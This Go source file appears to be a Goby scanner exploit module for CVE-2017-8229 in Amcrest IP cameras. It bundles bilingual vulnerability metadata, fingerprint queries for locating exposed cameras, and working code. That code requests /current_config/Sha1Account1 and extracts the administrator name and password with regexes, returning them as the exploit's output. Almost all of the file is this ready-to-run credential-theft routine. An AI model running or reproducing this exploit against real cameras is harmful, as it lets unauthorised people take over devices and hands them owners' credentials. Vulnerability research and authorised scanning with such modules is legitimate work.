package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Amcrest IP Camera Sha1Account1 Api Information Disclosure Vulnerability (CVE-2017-8229)",
    "Description": "<p>The Amcrest IP Camera is a wireless IP camera from Amcrest that allows unauthenticated attackers to download administrative credentials.</p><p>The attacker could exploit this vulnerability to download administrative credentials.</p>",
    "Impact": "<p>Amcrest IP Camera Information Disclosure (CVE-2017-8229)</p>",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://amcrest.com/\">https://amcrest.com/</a></p>",
    "Product": "Amcrest IP Camera",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Amcrest IP Camera 无线IP摄像头 Sha1Account1 接口信息泄露漏洞（CVE-2017-8229）",
            "Product": "Amcrest IP Camera",
            "Description": "<p>Amcrest IP Camera是Amcrest公司的一款无线IP摄像头，设备允许未经身份验证的攻击者下载管理凭据。</p><p>Amcrest IP Camera 存在信息泄露漏洞，攻击者可利用该漏洞下载管理凭证。</p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://amcrest.com/\">https://amcrest.com/</a></p>",
            "Impact": "<p>Amcrest IP Camera 存在信息泄露漏洞，设备允许未经身份验证的攻击者下载管理凭据。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Amcrest IP Camera Sha1Account1 Api Information Disclosure Vulnerability (CVE-2017-8229)",
            "Product": "Amcrest IP Camera",
            "Description": "<p>The Amcrest IP Camera is a wireless IP camera from Amcrest that allows unauthenticated attackers to download administrative credentials.</p><p>The attacker could exploit this vulnerability to download administrative credentials.</p>",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://amcrest.com/\">https://amcrest.com/</a></p>",
            "Impact": "<p>Amcrest IP Camera Information Disclosure (CVE-2017-8229)</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "((body=\"amcrest\" && body=\"w_cloudCurVer\") || (body=\"onclick=\\\"chkAlarmSound()\" && body=\"id=\\\"play_alarm_sound\" && body=\"Amcrest Technologies\") || (body=\"dhvideowhmode\" && body=\"platformHtm\" && (body=\"Amcrest\" || body=\"www.amcrest.com\")))",
    "GobyQuery": "((body=\"amcrest\" && body=\"w_cloudCurVer\") || (body=\"onclick=\\\"chkAlarmSound()\" && body=\"id=\\\"play_alarm_sound\" && body=\"Amcrest Technologies\") || (body=\"dhvideowhmode\" && body=\"platformHtm\" && (body=\"Amcrest\" || body=\"www.amcrest.com\")))",
    "Author": "AnMing",
    "Homepage": "https://amcrest.com/",
    "DisclosureDate": "2022-03-01",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5471",
        "https://www.cnvd.org.cn/flaw/show/CNVD-2019-24194"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.0",
    "CVEIDs": [
        "CVE-2017-8229"
    ],
    "CNVD": [
        "CNVD-2019-24194"
    ],
    "CNNVD": [
        "CNNVD-201907-200"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10259"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/current_config/Sha1Account1"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.IP)
			cfg.Header.Store("Accept-Language", " zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				reg := regexp.MustCompile(`"Password" : "(.*?)"`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/current_config/Sha1Account1"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.IP)
			cfg.Header.Store("Accept-Language", " zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`"Password" : "(.*?)"`)
				password := reg.FindStringSubmatch(resp.Utf8Html)
				namereg := regexp.MustCompile(`"Name" : "(.*?)"`)
				name := namereg.FindStringSubmatch(resp.Utf8Html)
				if len(password) > 0 {
					expResult.Success = true
					expResult.Output = name[0] + password[0]
				}
			}
			return expResult
		},
	))
}
